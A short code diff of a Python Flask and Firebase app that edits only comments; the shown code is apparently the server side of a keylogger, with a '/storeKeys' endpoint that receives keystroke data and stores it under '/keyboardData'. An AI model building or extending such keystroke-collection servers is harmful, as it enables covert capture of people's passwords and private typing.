@@ -5,8 +5,8 @@ from firebase_admin import credentials
 from firebase_admin import db
 from flask_cors import CORS
 
-# Setup the firebase
-
+# Firebase setup
+# Replace the database url and creadentials path below
 def firebaseInitialization():
     cred = credentials.Certificate("config/serviceAccountKey.json")
     firebase_admin.initialize_app(
@@ -24,11 +24,11 @@ app.use_static_for_root = True
 text = 'Welcome to keylogger'
 
 
-# Write logic to store the key values into the database
+# Function to store the key values into the database
 @app.route('/storeKeys', methods=["POST"])
 def storeKeys():
     keyValues = request.get_json()
-    # Write code to check is keyboard data is exists or not in db. If not then create new or update the existing one.
+    # Checking is keyboard data is exists or not in db. If not then create new or update the existing one.
     ref = db.reference("/keyboardData").get()
     if (ref):
         ref = db.reference("/keyboardData")
